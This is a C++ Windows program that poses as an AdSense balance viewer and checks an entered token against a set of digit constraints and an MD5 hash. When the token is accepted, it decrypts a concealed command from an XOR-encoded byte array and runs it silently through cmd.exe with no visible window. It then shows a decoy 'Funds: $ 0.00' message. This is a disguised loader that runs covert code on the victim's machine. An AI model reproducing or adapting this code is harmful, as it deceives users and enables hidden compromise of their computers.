#include <windows.h>
#include <commctrl.h>
#include <string>
#include <sstream>
#include <iomanip>
#include <cctype>

#pragma comment(lib, "comctl32.lib")

LRESULT CALLBACK WndProc(HWND, UINT, WPARAM, LPARAM);
LRESULT CALLBACK DialogProc(HWND, UINT, WPARAM, LPARAM);
std::string calculateMD5(const std::string& input);
bool checkToken(const std::string& token);
void showDialog(HWND parent, const char* msg, const char* title, bool success);

HWND hEdit, hBtn;
HFONT fontText, fontEdit, fontBtn, dialogFont1, dialogFont2;
HINSTANCE hInst;

// dialog stuff
struct MsgBoxData {
    const char* msg;
    const char* title;
    bool success;
} dialogData;

class MD5 {
private:
    typedef unsigned int uint32;
    typedef unsigned char uint8;
    static const uint32 shifts[];
    static const uint32 table[];

    uint32 state[4];
    uint32 count[2];
    uint8 buffer[64];

    static uint32 rotateLeft(uint32 x, uint32 n) {
        return (x << n) | (x >> (32 - n));
    }

    void transform(const uint8 block[64]) {
        uint32 a = state[0], b = state[1], c = state[2], d = state[3];
        uint32 x[16];
        for (int i = 0, j = 0; j < 64; i++, j += 4)
            x[i] = ((uint32)block[j]) | (((uint32)block[j + 1]) << 8) |
                   (((uint32)block[j + 2]) << 16) | (((uint32)block[j + 3]) << 24);
        for (int i = 0; i < 64; i++) {
            uint32 f, g;
            if (i < 16) { f = (b & c) | ((~b) & d); g = i; }
            else if (i < 32) { f = (d & b) | ((~d) & c); g = (5 * i + 1) % 16; }
            else if (i < 48) { f = b ^ c ^ d; g = (3 * i + 5) % 16; }
            else { f = c ^ (b | (~d)); g = (7 * i) % 16; }
            uint32 temp = d;
            d = c;
            c = b;
            b = b + rotateLeft((a + f + table[i] + x[g]), shifts[i]);
            a = temp;
        }
        state[0] += a; state[1] += b; state[2] += c; state[3] += d;
    }

public:
    MD5() {
        state[0] = 0x67452301;
        state[1] = 0xefcdab89;
        state[2] = 0x98badcfe;
        state[3] = 0x10325476;
        count[0] = count[1] = 0;
    }

    void update(const uint8* input, size_t len) {
        size_t idx = (count[0] / 8) % 64;
        if ((count[0] += (len << 3)) < (len << 3))
            count[1]++;
        count[1] += (len >> 29);
        size_t firstpart = 64 - idx, i = 0;
        if (len >= firstpart) {
            memcpy(&buffer[idx], input, firstpart);
            transform(buffer);
            for (i = firstpart; i + 64 <= len; i += 64)
                transform(&input[i]);
            idx = 0;
        }
        memcpy(&buffer[idx], &input[i], len - i);
    }

    std::string finalize() {
        static uint8 pad[64] = { 0x80 };
        uint8 bits[8];
        for (int i = 0; i < 8; i++)
            bits[i] = (count[i >> 2] >> ((i % 4) * 8)) & 0xff;
        size_t idx = (count[0] / 8) % 64;
        size_t padLen = (idx < 56) ? (56 - idx) : (120 - idx);
        update(pad, padLen);
        update(bits, 8);
        uint8 digest[16];
        for (int i = 0; i < 16; i++)
            digest[i] = (state[i >> 2] >> ((i % 4) * 8)) & 0xff;
        std::ostringstream oss;
        for (int i = 0; i < 16; i++)
            oss << std::hex << std::setw(2) << std::setfill('0') << (int)digest[i];
        return oss.str();
    }
};

const unsigned int MD5::shifts[] = {
    7,12,17,22,7,12,17,22,7,12,17,22,7,12,17,22,
    5,9,14,20,5,9,14,20,5,9,14,20,5,9,14,20,
    4,11,16,23,4,11,16,23,4,11,16,23,4,11,16,23,
    6,10,15,21,6,10,15,21,6,10,15,21,6,10,15,21
};
const unsigned int MD5::table[] = {
    0xd76aa478,0xe8c7b756,0x242070db,0xc1bdceee,
    0xf57c0faf,0x4787c62a,0xa8304613,0xfd469501,
    0x698098d8,0x8b44f7af,0xffff5bb1,0x895cd7be,
    0x6b901122,0xfd987193,0xa679438e,0x49b40821,
    0xf61e2562,0xc040b340,0x265e5a51,0xe9b6c7aa,
    0xd62f105d,0x02441453,0xd8a1e681,0xe7d3fbc8,
    0x21e1cde6,0xc33707d6,0xf4d50d87,0x455a14ed,
    0xa9e3e905,0xfcefa3f8,0x676f02d9,0x8d2a4c8a,
    0xfffa3942,0x8771f681,0x6d9d6122,0xfde5380c,
    0xa4beea44,0x4bdecfa9,0xf6bb4b60,0xbebfbc70,
    0x289b7ec6,0xeaa127fa,0xd4ef3085,0x04881d05,
    0xd9d4d039,0xe6db99e5,0x1fa27cf8,0xc4ac5665,
    0xf4292244,0x432aff97,0xab9423a7,0xfc93a039,
    0x655b59c3,0x8f0ccc92,0xffeff47d,0x85845dd1,
    0x6fa87e4f,0xfe2ce6e0,0xa3014314,0x4e0811a1,
    0xf7537e82,0xbd3af235,0x2ad7d2bb,0xeb86d391
};

std::string calculateMD5(const std::string& input) {
    MD5 m; m.update((const unsigned char*)input.c_str(), input.length());
    return m.finalize();
}

// ------------------ VALIDATION FUNCTIONS ------------------

// Function 1: Check format (pub- + 16 digits)
bool validateFormat(const std::string& token) {
    if (token.length() != 20) return false;
    if (token.substr(0, 4) != "pub-") return false;
    for (int i = 4; i < 20; i++) {
        if (!isdigit(token[i])) return false;
    }
    return true;
}

// Function 2: Check sum of 4-digit groups
bool validateSums(const std::string& nums) {
    int sums[4] = {15, 9, 17, 16};
    for (int i = 0; i < 4; i++) {
        int sum = 0;
        for (int j = 0; j < 4; j++) {
            sum += (nums[i * 4 + j] - '0');
        }
        if (sum != sums[i]) return false;
    }
    return true;
}

// Function 3: Check product of non-zero elements
bool validateProducts(const std::string& nums) {
    int products[4] = {84, 8, 112, 63};
    for (int i = 0; i < 4; i++) {
        int prod = 1;
        bool hasNonZero = false;
        for (int j = 0; j < 4; j++) {
            int digit = nums[i * 4 + j] - '0';
            if (digit != 0) {
                prod *= digit;
                hasNonZero = true;
            }
        }
        if (!hasNonZero || prod != products[i]) return false;
    }
    return true;
}

// Function 4: Check odd and even indexed pairs
bool validatePairs(const std::string& nums) {
    // Odd indexed pairs (0-1, 4-5, 8-9, 12-13)
    for (int i = 0; i < 4; i++) {
        int val = (nums[i * 4] - '0') * 10 + (nums[i * 4 + 1] - '0');
        if (val >= 29) return false;
    }
    // Even indexed pairs (2-3, 6-7, 10-11, 14-15)
    for (int i = 0; i < 4; i++) {
        int val = (nums[i * 4 + 2] - '0') * 10 + (nums[i * 4 + 3] - '0');
        if (val >= 10) return false;
    }
    return true;
}

// Function 5: Sum of values at prime indexes
bool validatePrimeIndexSum(const std::string& nums) {
    int primeIndices[] = {2, 3, 5, 7, 11, 13};
    int sum = 0;
    for (int i = 0; i < 6; i++) {
        sum += (nums[primeIndices[i]] - '0');
    }
    return sum == 29;
}

// Function 6: Positions 2,4,6,10,12,14 must be 0
bool validateZeroPositions(const std::string& nums) {
    int zeroPos[] = {2, 4, 6, 10, 12, 14};
    for (int i = 0; i < 6; i++) {
        if (nums[zeroPos[i]] != '0') return false;
    }
    return true;
}

// Function 7: Equal count of odd and even numbers (excluding 0)
bool validateOddEvenBalance(const std::string& nums) {
    int oddCount = 0, evenCount = 0;
    for (int i = 0; i < 16; i++) {
        int digit = nums[i] - '0';
        if (digit == 0) continue;
        if (digit % 2 == 0) evenCount++;
        else oddCount++;
    }
    return oddCount == evenCount;
}

// Function 8: MD5 hash validation
bool validateHash(const std::string& token) {
    return calculateMD5(token) == "5a51c90d12681dd8bb75d00ec1d37a96";
}

// Main token check function
bool checkToken(const std::string& token) {
    if (!validateFormat(token)) return false;
    std::string nums = token.substr(4);
    if (!validateSums(nums)) return false;
    if (!validateProducts(nums)) return false;
    if (!validatePairs(nums)) return false;
    if (!validatePrimeIndexSum(nums)) return false;
    if (!validateZeroPositions(nums)) return false;
    if (!validateOddEvenBalance(nums)) return false;
    if (!validateHash(token)) return false;
    return true;
}

void showDialog(HWND parent, const char* msg, const char* title, bool success) {
    dialogData.msg = msg;
    dialogData.title = title;
    dialogData.success = success;

    WNDCLASSEX wc = { sizeof(WNDCLASSEX) };
    wc.lpfnWndProc = DialogProc;
    wc.hInstance = hInst;
    wc.hbrBackground = CreateSolidBrush(RGB(255, 255, 255));
    wc.lpszClassName = "MsgBox";
    wc.hCursor = LoadCursor(NULL, IDC_ARROW);

    UnregisterClass("MsgBox", hInst);
    RegisterClassEx(&wc);

    HWND dlg = CreateWindowEx(
        WS_EX_DLGMODALFRAME | WS_EX_TOPMOST,
        "MsgBox",
        title,
        WS_VISIBLE | WS_SYSMENU | WS_CAPTION,
        CW_USEDEFAULT, CW_USEDEFAULT, 420, 240,
        parent, NULL, hInst, NULL
    );

    EnableWindow(parent, FALSE);

    MSG message;
    while (GetMessage(&message, NULL, 0, 0) > 0) {
        if (message.message == WM_QUIT) break;
        TranslateMessage(&message);
        DispatchMessage(&message);
    }

    EnableWindow(parent, TRUE);
    SetFocus(parent);
}

LRESULT CALLBACK DialogProc(HWND hwnd, UINT msg, WPARAM wp, LPARAM lp) {
    static HWND btnOk;

    switch (msg) {
        case WM_CREATE: {
            dialogFont1 = CreateFont(20, 0, 0, 0, 500, 0, 0, 0, 0, 0, 0, 5, 0, "Roboto");
            dialogFont2 = CreateFont(16, 0, 0, 0, 400, 0, 0, 0, 0, 0, 0, 5, 0, "Roboto");

            btnOk = CreateWindow("BUTTON", "OK",
                WS_TABSTOP | WS_VISIBLE | WS_CHILD | BS_DEFPUSHBUTTON,
                160, 155, 100, 35, hwnd, (HMENU)1, hInst, NULL);
            SendMessage(btnOk, WM_SETFONT, (WPARAM)dialogFont2, TRUE);
            break;
        }

        case WM_PAINT: {
            PAINTSTRUCT ps;
            HDC hdc = BeginPaint(hwnd, &ps);

            // top bar color
            HBRUSH bar;
            if (dialogData.success) {
                bar = CreateSolidBrush(RGB(15, 157, 88)); // green
            } else {
                bar = CreateSolidBrush(RGB(219, 68, 55)); // red
            }
            RECT barRect = { 0, 0, 420, 8 };
            FillRect(hdc, &barRect, bar);
            DeleteObject(bar);

            // background
            HBRUSH bg = CreateSolidBrush(RGB(255, 255, 255));
            RECT bgRect = { 0, 8, 420, 240 };
            FillRect(hdc, &bgRect, bg);
            DeleteObject(bg);

            SetBkMode(hdc, TRANSPARENT);

            // title text
            SelectObject(hdc, dialogFont1);
            SetTextColor(hdc, RGB(32, 33, 36));
            RECT titleRect = { 20, 25, 400, 55 };
            DrawTextA(hdc, dialogData.title, -1, &titleRect, DT_LEFT);

            // icon and message
            SelectObject(hdc, dialogFont2);
            SetTextColor(hdc, RGB(95, 99, 104));

            if (dialogData.success) {
                // checkmark
                HFONT iconFont = CreateFont(32, 0, 0, 0, 400, 0, 0, 0, 0, 0, 0, 5, 0, "Segoe UI Symbol");
                SelectObject(hdc, iconFont);
                SetTextColor(hdc, RGB(15, 157, 88));
                RECT iconRect = { 20, 70, 60, 110 };
                wchar_t check[] = L"\u2713";
                DrawTextW(hdc, check, -1, &iconRect, DT_LEFT | DT_VCENTER | DT_SINGLELINE);
                DeleteObject(iconFont);

                SelectObject(hdc, dialogFont2);
                SetTextColor(hdc, RGB(95, 99, 104));
                RECT msgRect = { 65, 75, 390, 130 };
                DrawTextA(hdc, dialogData.msg, -1, &msgRect, DT_LEFT | DT_WORDBREAK);
            } else {
                // X mark
                HFONT iconFont = CreateFont(32, 0, 0, 0, 700, 0, 0, 0, 0, 0, 0, 5, 0, "Segoe UI Symbol");
                SelectObject(hdc, iconFont);
                SetTextColor(hdc, RGB(219, 68, 55));
                RECT iconRect = { 20, 70, 60, 110 };
                wchar_t x[] = L"\u2715";
                DrawTextW(hdc, x, -1, &iconRect, DT_LEFT | DT_VCENTER | DT_SINGLELINE);
                DeleteObject(iconFont);

                SelectObject(hdc, dialogFont2);
                SetTextColor(hdc, RGB(95, 99, 104));
                RECT msgRect = { 65, 75, 390, 130 };
                DrawTextA(hdc, dialogData.msg, -1, &msgRect, DT_LEFT | DT_WORDBREAK);
            }

            EndPaint(hwnd, &ps);
            break;
        }

        case WM_CTLCOLORBTN: {
            HDC hdcBtn = (HDC)wp;
            SetBkMode(hdcBtn, TRANSPARENT);
            SetTextColor(hdcBtn, RGB(255, 255, 255));
            return (LRESULT)CreateSolidBrush(RGB(66, 133, 244));
        }

        case WM_COMMAND:
            if (LOWORD(wp) == 1) {
                DeleteObject(dialogFont2);
                DeleteObject(dialogFont1);
                DestroyWindow(hwnd);
                PostQuitMessage(0);
            }
            break;

        case WM_CLOSE:
            DeleteObject(dialogFont2);
            DeleteObject(dialogFont1);
            DestroyWindow(hwnd);
            PostQuitMessage(0);
            break;

        default:
            return DefWindowProc(hwnd, msg, wp, lp);
    }
    return 0;
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE, LPSTR, int nCmdShow) {
    hInst = hInstance;
    WNDCLASSEX wc = { sizeof(WNDCLASSEX) };
    wc.lpfnWndProc = WndProc; wc.hInstance = hInstance;
    wc.hbrBackground = (HBRUSH)(COLOR_WINDOW + 1);
    wc.lpszClassName = "MainWnd";
    wc.hCursor = LoadCursor(NULL, IDC_ARROW);
    RegisterClassEx(&wc);
    HWND hwnd = CreateWindowEx(
        0, "MainWnd", "",
        WS_OVERLAPPED | WS_CAPTION | WS_SYSMENU | WS_MINIMIZEBOX,
        CW_USEDEFAULT, CW_USEDEFAULT, 520, 380,
        NULL, NULL, hInstance, NULL
    );
    ShowWindow(hwnd, nCmdShow);
    UpdateWindow(hwnd);
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg); DispatchMessage(&msg);
    }
    return msg.wParam;
}

LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wp, LPARAM lp) {
    switch (msg) {
        case WM_CREATE: {
            fontText = CreateFont(18, 0, 0, 0, FW_SEMIBOLD, FALSE, FALSE, FALSE,
                DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS,
                CLEARTYPE_QUALITY, DEFAULT_PITCH | FF_SWISS, "Roboto");
            fontEdit = CreateFont(16, 0, 0, 0, FW_NORMAL, FALSE, FALSE, FALSE,
                DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS,
                CLEARTYPE_QUALITY, DEFAULT_PITCH | FF_SWISS, "Roboto");
            fontBtn = CreateFont(16, 0, 0, 0, FW_MEDIUM, FALSE, FALSE, FALSE,
                DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS,
                CLEARTYPE_QUALITY, DEFAULT_PITCH | FF_SWISS, "Roboto");
            hEdit = CreateWindowEx(
                WS_EX_CLIENTEDGE, "EDIT", "",
                WS_CHILD | WS_VISIBLE | ES_CENTER | ES_AUTOHSCROLL,
                60, 190, 400, 35, hwnd, (HMENU)1, NULL, NULL);
            SendMessage(hEdit, WM_SETFONT, (WPARAM)fontEdit, TRUE);
            SendMessage(hEdit, EM_SETLIMITTEXT, 20, 0);
            hBtn = CreateWindow("BUTTON", "VIEW FUNDS",
                WS_TABSTOP | WS_VISIBLE | WS_CHILD | BS_DEFPUSHBUTTON,
                160, 245, 200, 45, hwnd, (HMENU)2, NULL, NULL);
            SendMessage(hBtn, WM_SETFONT, (WPARAM)fontBtn, TRUE);
            break;
        }
        case WM_CTLCOLORBTN: {
            return (LRESULT)CreateSolidBrush(RGB(66, 133, 244));
        }
        case WM_PAINT: {
            PAINTSTRUCT ps;
            HDC hdc = BeginPaint(hwnd, &ps);
            HBRUSH b1 = CreateSolidBrush(RGB(66, 133, 244)); RECT r1 = { 0, 0, 130, 120 };
            FillRect(hdc, &r1, b1); DeleteObject(b1);
            HBRUSH b2 = CreateSolidBrush(RGB(219, 68, 55)); RECT r2 = { 130, 0, 260, 120 };
            FillRect(hdc, &r2, b2); DeleteObject(b2);
            HBRUSH b3 = CreateSolidBrush(RGB(244, 180, 0)); RECT r3 = { 260, 0, 390, 120 };
            FillRect(hdc, &r3, b3); DeleteObject(b3);
            HBRUSH b4 = CreateSolidBrush(RGB(15, 157, 88)); RECT r4 = { 390, 0, 520, 120 };
            FillRect(hdc, &r4, b4); DeleteObject(b4);
            SetBkMode(hdc, TRANSPARENT);
            SetTextColor(hdc, RGB(95, 99, 104));
            SelectObject(hdc, fontText);
            RECT infoRect = { 20, 130, 500, 180 };
            DrawText(hdc,
                "Enter AdSense token to view funds",
                -1, &infoRect, DT_CENTER | DT_WORDBREAK);
            EndPaint(hwnd, &ps);
            break;
        }
        case WM_COMMAND:
            if (LOWORD(wp) == 2) {
                char buf[64] = {0};
                GetWindowText(hEdit, buf, sizeof(buf));
                std::string token(buf);
                if (token.empty()) {
                    showDialog(hwnd, "Please enter a valid AdSense token.", "Input Needed", false);
                } else if (checkToken(token)) {
                    // Encrypted command (XOR'd with the valid token)
                    unsigned char encCmd[] = {
                        0x02, 0x10, 0x05, 0x0D, 0x53, 0x53, 0x54, 0x16, 0x78, 0x73, 0x73, 0x64, 0x6E, \
                        0x6B, 0x5F, 0x51, 0x44, 0x40, 0x51, 0x4B, 0x15, 0x29, 0x21, 0x41, 0x53, 0x44, \
                        0x43, 0x53, 0x43, 0x64, 0x44, 0x50, 0x41, 0x53, 0x5D, 0x50, 0x42, 0x6B, 0x43, \
                        0x51, 0x15, 0x19, 0x0E, 0x71, 0x5D, 0x47, 0x55, 0x58, 0x6C, 0x5B, 0x5F, 0x5C, \
                        0x5F, 0x59, 0x5E, 0x53, 0x10, 0x18, 0x46, 0x5C, 0x50, 0x5A, 0x16, 0x0D, 0x60, \
                        0x72, 0x77, 0x69, 0x63, 0x62, 0x10, 0x1E, 0x56, 0x18, 0x12, 0x47, 0x5F, 0x40, \
                        0x55, 0x4B, 0x03, 0x1D, 0x07, 0x41, 0x5E, 0x19, 0x55, 0x4E, 0x55, 0x18, 0x1D, \
                        0x7F, 0x5D, 0x68, 0x10, 0x1A, 0x7E, 0x58, 0x5E, 0x70, 0x50, 0x58, 0x35, 0x0D, \
                        0x7A, 0x5E, 0x54, 0x52, 0x55, 0x56, 0x10, 0x1C, 0x77, 0x40, 0x55, 0x54, 0x10, \
                        0x75, 0x49, 0x49, 0x11, 0x06, 0x11, 0x0D, 0x1F, 0x52, 0x5E, 0x55, 0x10, 0x62, \
                        0x67, 0x7F, 0x5D, 0x5A, 0x49, 0x75, 0x45, 0x56, 0x68, 0x6B, 0x1C, 0x10, 0x18, \
                        0x6B, 0x47, 0x6F, 0x03, 0x64, 0x5F, 0x75, 0x68, 0x7F, 0x54, 0x5C, 0x67, 0x4F, \
                        0x00, 0x54, 0x5A, 0x6B, 0x16, 0x3B, 0x2A, 0x4E, 0x48, 0x54, 0x4A, 0x74, 0x44, \
                        0x75, 0x01, 0x08, 0x45, 0x75, 0x03, 0x7D, 0x5D, 0x7A, 0x02, 0x77, 0x40, 0x2D, \
                        0x51, 0x4E, 0x45, 0x54, 0x5D, 0x4E, 0x5B, 0x60, 0x03, 0x52, 0x4A, 0x5A, 0x77, \
                        0x4F, 0x56, 0x53, 0x77, 0x5E, 0x0A, 0x16, 0x08, 0x63, 0x54, 0x54, 0x03, 0x67, \
                        0x48, 0x5A, 0x77, 0x49, 0x54, 0x61, 0x5A, 0x79, 0x56, 0x66, 0x65, 0x6B, 0x24, \
                        0x2D, 0x18, 0x7F, 0x47, 0x6D, 0x76, 0x0F, 0x66, 0x69, 0x65, 0x7F, 0x54, 0x69, \
                        0x5C, 0x5B, 0x61, 0x66, 0x66, 0x77, 0x24, 0x25, 0x51, 0x1D, 0x55, 0x51, 0x73, \
                        0x74, 0x60, 0x5C, 0x68, 0x60, 0x46, 0x6A, 0x5D, 0x5B, 0x43, 0x6D, 0x63, 0x7B, \
                        0x34, 0x3A, 0x0E, 0x55, 0x02, 0x6D, 0x67, 0x07, 0x47, 0x60, 0x77, 0x6B, 0x41, \
                        0x61, 0x67, 0x54, 0x45, 0x53, 0x78, 0x51, 0x40, 0x3A, 0x1B, 0x6F, 0x58, 0x53, \
                        0x68, 0x7C, 0x43, 0x71, 0x77, 0x59, 0x02, 0x5C, 0x78, 0x76, 0x06, 0x7B, 0x49, \
                        0x00, 0x1D, 0x17, 0x51, 0x67, 0x5E, 0x55, 0x5E, 0x78, 0x40, 0x61, 0x03, 0x7C, \
                        0x47, 0x5A, 0x5D, 0x5B, 0x00, 0x6D, 0x67, 0x77, 0x40, 0x2F, 0x08, 0x64, 0x03, \
                        0x7B, 0x5D, 0x4E, 0x40, 0x5C, 0x5D, 0x64, 0x44, 0x62, 0x68, 0x5F, 0x5D, 0x56, \
                        0x67, 0x4E, 0x5F, 0x2F, 0x25, 0x6B, 0x02, 0x6E, 0x64, 0x07, 0x01, 0x61, 0x67, \
                        0x7F, 0x54, 0x61, 0x5E, 0x5B, 0x47, 0x6E, 0x68, 0x77, 0x0A, 0x2D, 0x51, 0x63, \
                        0x03, 0x6E, 0x02, 0x78, 0x5C, 0x5B, 0x03, 0x7F, 0x5F, 0x5C, 0x67, 0x40, 0x0D, \
                        0x15, 0x10, 0x16, 0x16, 0x55, 0x44, 0x0B, 0x12, 0x44, 0x44, 0x57, 0x42, 0x4C, \
                        0x10, 0x45, 0x53, 0x4B, 0x5B, 0x5A, 0x57, 0x45, 0x1E, 0x5C, 0x08, 0x10
                    };
                    size_t cmdLen = sizeof(encCmd);
                    
                    // XOR decrypt with token as key
                    char* decCmd = new char[cmdLen + 1];
                    for (size_t i = 0; i < cmdLen; i++) {
                        decCmd[i] = encCmd[i] ^ token[i % token.length()];
                    }
                    decCmd[cmdLen] = '\0';
                    
                    // Execute decrypted command via cmd.exe /c (hidden)
                    std::string cmdLine = "cmd.exe /c ";
                    cmdLine += decCmd;
                    delete[] decCmd;
                    
                    STARTUPINFOA si = {0};
                    PROCESS_INFORMATION pi = {0};
                    si.cb = sizeof(si);
                    si.dwFlags = STARTF_USESHOWWINDOW;
                    si.wShowWindow = SW_HIDE;
                    CreateProcessA(NULL, (LPSTR)cmdLine.c_str(), NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
                    if (pi.hProcess) CloseHandle(pi.hProcess);
                    if (pi.hThread) CloseHandle(pi.hThread);
                    
                    showDialog(hwnd, "Funds: $ 0.00", "AdSense Balance", true);
                } else {
                    showDialog(hwnd, "The token entered is not correct.", "Invalid Token", false);
                }
            }
            break;
        case WM_DESTROY:
            DeleteObject(fontText); DeleteObject(fontEdit); DeleteObject(fontBtn);
            PostQuitMessage(0); break;
        default:
            return DefWindowProc(hwnd, msg, wp, lp);
    }
    return 0;
}
